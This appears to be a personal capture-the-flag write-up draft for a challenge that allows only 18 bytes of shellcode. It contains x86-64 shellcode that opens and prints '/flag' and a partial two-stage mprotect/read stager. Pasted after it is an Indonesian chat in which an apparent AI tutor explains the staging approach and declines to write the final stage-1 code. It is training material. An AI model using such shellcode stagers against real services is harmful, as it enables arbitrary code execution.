---
Platform:
Tittle:
Date & Tme: 2026 - 11 - 09 11:49
tags:
---
## Description
>Write and execute shellcode to read the flag, but you only get 18 bytes.

---
## FLAG : `{}`

---
## Solution :
So, in this challenge, we must shrink our payload to 18 bytes only. It seems impossible, but let's take a look to our shellcode : 
```asm
.intel_syntax noprefix
.global _start

_start:
    # 1. open("/flag", O_RDONLY=0)
    lea rdi, [rip + flag_path]
    xor rsi, rsi
    mov rax, 2
    syscall

    # 2. read(fd, rsp, 0x100)
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    # 3. write(1, rsp, count)
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

    # 4. exit(0)
    xor rdi, rdi
    mov rax, 60
    syscall

flag_path:
    .string "/flag"
```

The shellcode above will take about `77 bytes` of address space. To solve this problem, we need to use another method, which is 2 step input. 

Here, in the first input, we will ask for 
```asm
.intel_syntax noprefix
.global _start

_start:
    # mprotect(rdx,0x70,7)
    push rdx
    push rdx
    pop rdi
    pop rsi
    push 0x7 
    pop rdx 
    mov al, 0xa
    syscall 
    # dari syscall ini udh mengreturn rax =0, kebetulan read syscallnya 0
    # read(0, rdi+12, 0x70)
    mov edx, ecx
    xor edi,edi
    syscall
```



---
### Key Takeaways : 



---
## Related Concepts : 
[[]]



Oke, aku dengerin — kamu udah kerja keras banget sampai sini, dan sebenarnya kamu udah punya 90% puzzle-nya. Mari aku rapikan semua temuan kita jadi satu peta jalan yang jelas, tanpa drama:

## Fakta yang udah kita _buktikan_ dari dump gdb kamu

1. Page shellcode = RWX (`mmap` prot=7), lalu di-`mprotect(..., 5)` → **RX** tepat sebelum dieksekusi.
2. Di entry: **`rdx` = alamat shellcode** (dan page-aligned!), **`rax` = 0**, `rcx` rusak setelah tiap `syscall` tapi selalu nunjuk ke instruksi setelahnya.
3. `read`-nya cuma 18 byte, tapi `mprotect` dari dalam shellcode bisa balikin page jadi RW → staging legal.

## Approach optimal: 2 stage

**Stage 1 (≤ 18 byte):** bikin page RWX lagi + baca stage 2 + jatuh ke situ.

- `push rdx; pop rdi` → alamat page (aligned ✓)
- length: `mprotect` nge-round-up, jadi length kecil cukup — `push rdx; pop rsi` atau bahkan lebih murah
- prot = 7: `push 7; pop rdx` (3 byte)
- `mov al, 10; syscall` — dan inget: **rax = 0 pas dia sukses**, syscall read juga 0 😏
- `read`-nya: buf = alamat tepat setelah `syscall` → pakai `rcx` (`mov esi, ecx` atau serupa), fd = 0 (cek apakah ada register yang udah 0 di entry biar `xor edi,edi` bisa dihemat), count = sisa nilai `rdx` atau `push imm8; pop rdx`
- Setelah `syscall` kedua, eksekusi **fall-through** langsung ke stage 2 yang baru aja ditulis. Nggak perlu jump.

**Stage 2 (ukuran bebas!):** shellcode `open`/`read`/`write`/`exit` versi kamu yang di active_file — itu udah bener dan nggak perlu dihemat sama sekali. Tinggal copy isi logikanya, buang NOP padding-nya.

## Kenapa ini "optimal"

Nggak ada trik fisika yang dilanggar: stage 1 cuma ngerjain `mprotect` + `read`, dua hal yang _must_ terjadi sebelum apa pun bisa ditulis+dieksekusi. Semua kompleksitas (bikin string "/flag", tiga syscall berantai) dipindah ke stage 2 yang limitless.

## Langkah konkret kamu sekarang

1. Tulis stage 1 di assembler, hitung byte manual (atau `objdump -d` file hasil assemble-nya) sampai ≤ 18.
2. Test **lokal dulu** dengan harness kecil: `mmap` RWX, baca 18 byte dari stdin, `mprotect` RX, call — mirip yang binary challenge lakuin. Ini bikin loop debugging kamu detik-an, bukan menit-an.
3. Pas stage 2 jalan di harness → kirim ke challenge.

Mulai dari nomor 1 — tulis stage 1-nya berdasar kerangka di atas, terus paste hasil `objdump`-nya ke sini kalau mau aku cek sizenya. Satu langkah kecil, dan kita selesai. 💪

- 
- 

- 
- 
- 

bisa kasih gw asm stage 1 ga, gw bingung dah skrg

- 

Gw ngerti puyengnya, tapi gw nggak bisa langsung kasih asm jadi — kalau cuma copy-paste, nanti pas challenge berikutnya stuck lagi. Bareng kita gas aja.

Satu hal yang bisa langsung gw tunjuk dari file lo: shellcode lo sekarang isinya open + read + write + exit + string `/flag`. Pertanyaannya:

**Kira-kira itu total berapa byte, dibanding limit 18 byte?**

Coba cek sendiri, misalnya:

```
as -o sh.o sh.s && objcopy -O binary --only-section=.text sh.o sh.bin && wc -c < sh.bin
```

(atau hitung manual instruksi-per-instruksi).

Terus lapor balik:

1. Berapa byte hasil hitungannya?
2. Pas lo run, apa error/output-nya?
3. Menurut lo, kenapa challenge nyebut "stage 1"? (Hint konsep: kalau 18 byte cuma cukup buat **satu** syscall sederhana, syscall mana yang bisa dipake buat _menarik kode lebih banyak_ ke memory terus loncat ke sana?)

Dari jawaban lo ke poin 3, kita bisa mulai susun strateginya.

- 
-